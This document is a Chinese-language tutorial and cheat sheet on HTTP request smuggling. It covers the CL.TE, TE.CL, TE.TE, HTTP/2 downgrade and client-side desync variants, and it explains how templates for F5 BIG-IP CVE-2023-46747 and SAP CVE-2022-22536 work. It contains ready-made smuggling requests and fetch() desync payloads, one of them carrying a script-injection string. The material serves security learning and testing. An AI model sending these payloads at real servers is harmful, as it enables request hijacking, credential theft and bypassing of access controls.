# HTTP 请求走私 (Request Smuggling)

> 当多个"组件"处理请求时，如果它们对请求的起始/结束位置判断不一致，就会发生HTTP请求走私。这种不一致可能被用来干扰其他用户的请求/响应，或者绕过安全控制。通常发生在以下情况：优先使用不同的HTTP头部（Content-Length 与 Transfer-Encoding）、处理畸形头部的差异（例如是否忽略包含意外空格的头部）、从新协议降级请求，或者对部分请求超时和丢弃的时机判断不同。

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [CL.TE 漏洞](#clte-漏洞)
    * [TE.CL 漏洞](#tecl-漏洞)
    * [TE.TE 漏洞](#tete-漏洞)
    * [HTTP/2 请求走私](#http2-请求走私)
    * [客户端去同步攻击](#客户端去同步攻击)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - Burp Suite 扩展，用于发起 HTTP 请求走私攻击
* [defparam/Smuggler](https://github.com/defparam/smuggler) - 用 Python 3 编写的 HTTP 请求走私/去同步测试工具
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - 为 Burp Suite 从业者认证考试和 HTTP 请求走私实验开发的工具

## 方法学

如果您想手动利用 HTTP 请求走私漏洞，可能会遇到一些问题，特别是在 TE.CL 漏洞中，您需要为第二个请求（恶意请求）计算块大小，正如 PortSwigger 所建议的：`在请求走私攻击中手动修复长度字段可能很棘手`。

### CL.TE 漏洞

> 前端服务器使用 Content-Length 头部，而后端服务器使用 Transfer-Encoding 头部。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL 漏洞

> 前端服务器使用 Transfer-Encoding 头部，而后端服务器使用 Content-Length 头部。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: 要使用 Burp Repeater 发送此请求，首先需要转到 Repeater 菜单并确保取消选中"Update Content-Length"选项。您需要在最后的 0 后包含尾随序列 `\r\n\r\n`。

### TE.TE 漏洞

> 前端和后端服务器都支持 Transfer-Encoding 头部，但可以通过某种方式混淆头部来诱导其中一个服务器不处理它。

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 请求走私

如果机器将您的 HTTP/2 请求转换为 HTTP/1.1，并且您可以在转换后的请求中走私无效的 content-length 头部、transfer-encoding 头部或换行符（CRLF），则可能发生 HTTP/2 请求走私。如果您可以将 HTTP/1.1 请求隐藏在 HTTP/2 头部中，HTTP/2 请求走私也可能发生在 GET 请求中。

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## 客户端去同步攻击

在某些路径上，服务器不期望收到 POST 请求，会将其视为简单的 GET 请求并忽略有效负载，例如：

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

这可能会被当作两个请求处理，而实际上应该只是一个。当后端服务器响应两次时，前端服务器会认为只有第一个响应与此请求相关。

要利用此漏洞，攻击者可以使用 JavaScript 触发受害者向易受攻击的站点发送 POST 请求：

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

这可以用于：

* 让易受攻击的站点将受害者的凭据存储在攻击者可以访问的位置
* 让受害者向某个站点发送漏洞利用（例如，对于攻击者无法访问的内部站点，或者使攻击更难归因）
* 让受害者运行来自站点的任意 JavaScript

**示例**：

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // 抛出错误而不是跟随重定向
}).catch(() => {
        location = 'https://www.example.com/'
})
```

此脚本告诉受害者浏览器向 `www.example.com/redirect` 发送 `POST` 请求。这会返回一个被 CORS 阻止的重定向，并导致浏览器执行 catch 块，跳转到 `www.example.com`。

`www.example.com` 现在错误地处理了 `POST` 主体中的 `HEAD` 请求，而不是浏览器的 `GET` 请求，并返回 404 未找到和内容长度，然后回复被误解的第三个（`GET /x?x=<script>...`）请求，最后是浏览器的实际 `GET` 请求。
由于浏览器只发送了一个请求，它将 `HEAD` 请求的响应作为其 `GET` 请求的响应接受，并将第三个和第四个响应解释为响应体，从而执行攻击者的脚本。

## 实验环境

* [PortSwigger - HTTP 请求走私，基础 CL.TE 漏洞](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP 请求走私，基础 TE.CL 漏洞](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP 请求走私，混淆 TE 头部](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - 通过 H2.TE 请求走私进行响应队列投毒](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [PortSwigger - 客户端去同步](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## 参考资料

* [渗透测试人员指南：HTTP 请求走私 - Busra Demir - 2020年10月16日](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [高级请求走私 - PortSwigger - 2021年10月26日](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
* [浏览器驱动的去同步攻击：HTTP 请求走私的新领域 - James Kettle (@albinowax) - 2022年8月10日](https://portswigger.net/research/browser-powered-desync-attacks)
* [HTTP 去同步攻击：请求走私的重生 - James Kettle (@albinowax) - 2019年8月7日](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [请求走私教程 - PortSwigger - 2019年9月28日](https://portswigger.net/web-security/request-smuggling)

---

## 八、典型漏洞 YAML 文件分析

本目录收录了多种请求走私漏洞的利用模板，以下对部分典型 YAML 文件进行详细解读。

### 1. CVE-2023-46747.yaml (F5 BIG-IP AJP 走私 RCE)
- **漏洞类型**：认证绕过 & AJP 请求走私
- **漏洞原理**：
  该漏洞源于 F5 BIG-IP 的流量管理用户界面（TMUI）在处理 AJP 协议时存在缺陷。攻击者可以通过构造一个畸形的 HTTP 请求（包含 `Transfer-Encoding: chunked, chunked`），将一个恶意的、未经认证的 AJP 请求"走私"到后端。后端服务错误地处理这个被走私的 AJP 包，从而绕过认证检查，允许攻击者执行任意管理操作，最终导致远程代码执行。
- **探测原理**：
  该 YAML 模板在单个 POST 请求中，通过 `Transfer-Encoding: chunked, chunked` 和一个特定构造的十六进制 payload，将一个用于创建新管理员用户的 AJP 请求走私到后端。后续的 HTTP 请求则利用这个新创建的账户获取 token 并执行 `id` 命令，以验证 RCE 是否成功。
- **修复建议**：立即升级 F5 BIG-IP 至官方补丁版本。

### 2. CVE-2022-22536.yaml (SAP 内存管道去同步)
- **漏洞类型**：请求走私 (CL.TE-like)
- **漏洞原理**：
  SAP 的多种产品（如 NetWeaver）在处理 HTTP 请求时，其内部的内存管道（MPI）可能发生去同步。攻击者可以发送一个精心构造的 HTTP 请求，该请求的 `Content-Length` 头部声明了一个巨大的长度，但实际请求体很小。这会导致前端代理与后端应用服务器之间对请求边界的判断不一致。前端根据 `Content-Length` 读取请求，而后端可能在处理完第一个小请求后，将受害者的下一个合法请求拼接到攻击者请求的末尾，从而实现请求"拼接"或"走私"。
- **探测原理**：
  该模板发送一个带有巨大 `Content-Length` 值的 GET 请求，并在其后附加了第二个 GET 请求。如果服务器存在去同步漏洞，它可能会同时处理这两个请求，并将第二个请求的响应（或错误信息）附加到第一个请求的响应体中。模板通过匹配响应中是否包含第二个请求处理时产生的错误信息（如 `HTTP/1.0 400 Bad Request`）来判断漏洞是否存在。
- **修复建议**：应用 SAP 官方发布的安全补丁。

---

#### 总结
HTTP 请求走私的核心在于前端代理和后端服务器之间对 HTTP 请求边界的解析不一致。无论是利用 `Content-Length` 和 `Transfer-Encoding` 的差异 (CL.TE, TE.CL, TE.TE)，还是利用更深层次的协议问题（如 AJP 走私、HTTP/2 降级），最终目的都是让一个看似单一的请求在后端被拆分成多个，或将多个请求合并成一个，从而污染请求队列，劫持用户会话，绕过安全控制。防御的关键是确保整个请求处理链中的所有组件都使用同样严格、统一的标准来解析 HTTP 请求。
